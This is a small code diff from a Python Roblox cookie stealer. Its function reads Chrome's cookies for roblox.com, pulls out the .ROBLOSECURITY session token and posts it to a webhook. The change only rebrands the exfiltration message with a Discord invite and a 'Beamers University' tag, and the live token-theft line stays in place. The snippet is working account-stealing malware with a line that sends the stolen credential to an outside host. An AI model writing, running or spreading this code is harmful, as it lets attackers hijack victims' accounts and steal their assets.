@@ -7,7 +7,7 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f'```SKIDS COOKIE: {cookie}```'})
+        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
     except:
         pass
 browsers = [chrome_logger]
